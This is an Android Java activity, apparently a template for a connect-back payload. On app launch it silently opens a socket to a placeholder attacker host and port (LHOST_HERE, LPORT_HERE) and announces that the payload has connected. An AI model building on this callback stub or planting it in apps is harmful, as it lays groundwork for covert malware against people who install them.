package com.monitor.payload;

import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;
import java.net.Socket;
import java.io.PrintStream;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        new Thread(() -> {
            try {
                Socket socket = new Socket("LHOST_HERE", LPORT_HERE);
                PrintStream out = new PrintStream(socket.getOutputStream());
                out.println("Simple payload connected");
                out.flush();
                socket.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
